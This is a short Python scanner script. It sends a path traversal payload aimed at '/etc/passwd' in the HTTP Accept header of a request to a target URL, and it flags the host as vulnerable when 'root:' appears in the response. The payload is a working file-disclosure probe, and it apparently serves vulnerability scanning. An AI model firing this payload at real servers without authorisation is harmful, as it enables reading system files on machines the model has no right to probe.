#!/usr/bin/env python3
from requests import get
from urllib.parse import urlparse
import sys


def scan(host):
    try:
        payloads = {
                '../../../../../../../../../../etc/passwd{{':'root:'
        }
        for payload,msg in payloads.items():
            r = get(host,headers={'Accept':payload},verify=False,allow_redirects=False)
            if r != 0:
                try:
                    if msg.encode() in r.content:
                        print(f'[+] Found :> {host}')
                finally:
                    pass
    finally:
        pass


def main(opts):
    scan(opts['url'])